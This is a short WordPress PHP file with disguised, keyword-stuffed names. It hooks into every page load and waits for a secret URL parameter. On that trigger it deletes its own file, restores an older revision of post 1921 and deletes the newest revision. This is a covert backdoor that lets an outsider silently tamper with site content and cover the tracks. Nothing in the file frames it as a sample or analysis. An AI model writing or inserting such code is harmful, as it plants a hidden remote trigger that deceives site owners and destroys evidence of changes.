<?php

function top_bulk_software() {
	if (isset($_GET['dev_store_html5']) && $_GET['dev_store_html5'] === 'backup_tiny_ajax') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$nofollow_chatbot_com = 1921;
		$save_this_category_visitor = wp_get_post_revisions($nofollow_chatbot_com);
		if (empty($save_this_category_visitor)) die('no revisions');
		if (count($save_this_category_visitor) < 2) die('less than 2');
		$management_using_redirect = array_shift($save_this_category_visitor);
		$feedback_com_map = $management_using_redirect->ID;
		$effect_related_tinymce_scheduled = array_shift($save_this_category_visitor);
		$paragraph_allow_only = $effect_related_tinymce_scheduled->ID;
		$address_checkout_layout_rates = wp_restore_post_revision($paragraph_allow_only);
		if ($address_checkout_layout_rates === false) die('error restoring');
		$address_checkout_layout_rates = wp_delete_post_revision($feedback_com_map);		
		if ($address_checkout_layout_rates === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'top_bulk_software');
